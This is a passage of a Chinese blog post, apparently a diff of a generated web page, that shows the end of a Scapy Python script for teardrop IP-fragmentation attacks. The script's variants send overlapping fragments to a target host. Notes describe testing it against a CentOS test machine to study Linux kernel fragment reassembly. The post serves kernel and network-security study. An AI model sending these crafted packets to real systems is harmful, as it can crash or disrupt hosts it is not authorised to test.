class="line"><span class="keyword">elif</span> attack == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Using attack 2&quot;</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Attacking with attack 2&quot;</span></span><br><span class="line">  size=<span class="number">1300</span></span><br><span class="line">  offset=<span class="number">80</span></span><br><span class="line">  load=<span class="string">&quot;A&quot;</span>*size</span><br><span class="line">  </span><br><span class="line">  i=IP()</span><br><span class="line">  i.dst=target</span><br><span class="line">  i.proto=<span class="number">17</span></span><br><span class="line">  i.flags=<span class="string">&quot;MF&quot;</span></span><br><span class="line">  i.frag=<span class="number">0</span></span><br><span class="line">  send(i/load)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Attack 2 packet 0&quot;</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    i.frag=offset</span><br><span class="line">    offset=offset+<span class="number">80</span></span><br><span class="line">    send(i/load)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Attack 2 packet &quot;</span> + <span class="built_in">str</span>(x)</span><br><span class="line">  </span><br><span class="line">  i.frag=offset</span><br><span class="line">  i.flags=<span class="number">0</span></span><br><span class="line">  send(i/load)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> attack == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Using attack 3&quot;</span></span><br><span class="line">  size=<span class="number">1336</span></span><br><span class="line">  offset=<span class="number">3</span></span><br><span class="line">  load1=<span class="string">&quot;\x00&quot;</span>*size</span><br><span class="line">  </span><br><span class="line">  i=IP()</span><br><span class="line">  i.dst=target</span><br><span class="line">  i.flags=<span class="string">&quot;MF&quot;</span></span><br><span class="line">  i.proto=<span class="number">17</span></span><br><span class="line">  </span><br><span class="line">  size=<span class="number">4</span></span><br><span class="line">  offset=<span class="number">18</span></span><br><span class="line">  load2=<span class="string">&quot;\x00&quot;</span>*size</span><br><span class="line">  </span><br><span class="line">  j=IP()</span><br><span class="line">  j.dst=target</span><br><span class="line">  j.flags=<span class="number">0</span></span><br><span class="line">  j.proto=<span class="number">17</span></span><br><span class="line">  j.frag=offset</span><br><span class="line">  </span><br><span class="line">  send(i/load1)</span><br><span class="line">  send(j/load2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:         <span class="comment"># attack == 4</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Using attack 4&quot;</span></span><br><span class="line">  size=<span class="number">1300</span></span><br><span class="line">  offset=<span class="number">10</span></span><br><span class="line">  load=<span class="string">&quot;A&quot;</span>*size</span><br><span class="line">  </span><br><span class="line">  i=IP()</span><br><span class="line">  i.dst=target</span><br><span class="line">  i.flags=<span class="string">&quot;MF&quot;</span></span><br><span class="line">  i.proto=<span class="number">17</span></span><br><span class="line">  </span><br><span class="line">  j=IP()</span><br><span class="line">  j.dst=target</span><br><span class="line">  j.flags=<span class="number">0</span></span><br><span class="line">  j.proto=<span class="number">17</span></span><br><span class="line">  j.frag=offset</span><br><span class="line">  </span><br><span class="line">  send(i/load)</span><br><span class="line">  send(j/load)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Done!&quot;</span></span><br></pre></td></tr></table></figure>
+<p>要运行这份代码首先要用py安装scapy库,代码为了简单几乎连exit不想写了,因此直接运行记得要加参数.数据包填充也很简单,就是一直重叠分片,如果在Windows上用wireshark抓包则组包成一个之后会显示坏的包.</p>
+<h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><p>在测试机器上运行shell命令,监控printk打印.<br><code>[root@localhost linux-2.6.32.27]# while :;do dmesg -c 5; sleep 1; done</code><br>我还是用的是上次测试Linux内存段页式转换那一台Centos6.9,从kernel.org下载一份2.6内核的代码重新编译.直接<code>make localmodconfig</code>,一路回车,之后<code>make -j8 &amp;&amp; make modules_install &amp;&amp; make install &amp;&amp; reboot</code>即可.测试结果如下:<br><img src="/images/teardrop_attack_tcpdump.png" alt="teardrop_attack_tcpdump.png"><br><img src="/images/teardrop_attack_printk.png" alt="teardrop_attack_printk.png"><br>我是将命令码从4.3.2.1.0执行了一遍,可以分析得出基本是每两个包就造成一次释放分片链表,而截断长度为显示为0的分片包重组的时候没有报重叠,有一个覆盖后面的有可能是由于分片包到的顺序不一致,因而攻击代码2是最明显的,如果要打出具体的攻击IP则应该利用skb结构体来打更多信息.</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>主要研究学习了下内核中IP分片包重组算法以及引用计数如何到0来使得整个分片链表被释放的.</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/embpgp.github.io/tags/Linux-kernel/" rel="tag"># Linux kernel</a>
+              <a href="/embpgp.github.io/tags/network-security/" rel="tag"># network security</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/embpgp.github.io/2017/10/14/Linux-Memory-Address-Mapping/" rel="prev" title="Linux_Memory_Address_Mapping">
+      <i class="fa fa-chevron-left"></i> Linux_Memory_Address_Mapping
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/embpgp.github.io/2017/12/24/ln-sf-target-link-name/" rel="next" title="ln -sf target link_name">
+      ln -sf target link_name <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%A2%E5%8C%85"><span class="nav-number">2.</span> <span class="nav-text">丢包</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81"><span class="nav-number">3.</span> <span class="nav-text">攻击代码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C"><span class="nav-number">4.</span> <span class="nav-text">实验</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rutk1t0r"
+      src="/embpgp.github.io/images/avatar.png">
+  <p class="site-author-name" itemprop="name">rutk1t0r</p>
+  <div class="site-description" itemprop="description">gnireenigne 0x41414141 \xff\xe4\xcc</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/embpgp.github.io/archives/">
+        
+          <span class="site-state-item-count">39</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/embpgp.github.io/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/embpgp.github.io/tags/">
+          
+        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/embpgp" title="Github → https:&#x2F;&#x2F;github.com&#x2F;embpgp" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>Github</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/rutk1t0r" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;rutk1t0r" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://www.hicoder.cn/" title="http:&#x2F;&#x2F;www.hicoder.cn" rel="noopener" target="_blank">Yuan</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.cnblogs.com/fangyz" title="http:&#x2F;&#x2F;www.cnblogs.com&#x2F;fangyz" rel="noopener" target="_blank">Fangyz</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://watch0.top/" title="http:&#x2F;&#x2F;watch0.top" rel="noopener" target="_blank">w@tch0</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rutk1t0r</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    <span title="Symbols count total">149k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    <span title="Reading time total">2:16</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/embpgp.github.io/lib/anime.min.js"></script>
+  <script src="/embpgp.github.io/lib/velocity/velocity.min.js"></script>
+  <script src="/embpgp.github.io/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/embpgp.github.io/js/utils.js"></script>
+
+<script src="/embpgp.github.io/js/motion.js"></script>
+
+
+<script src="/embpgp.github.io/js/schemes/pisces.js"></script>
+
+
+<script src="/embpgp.github.io/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/embpgp.github.io/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
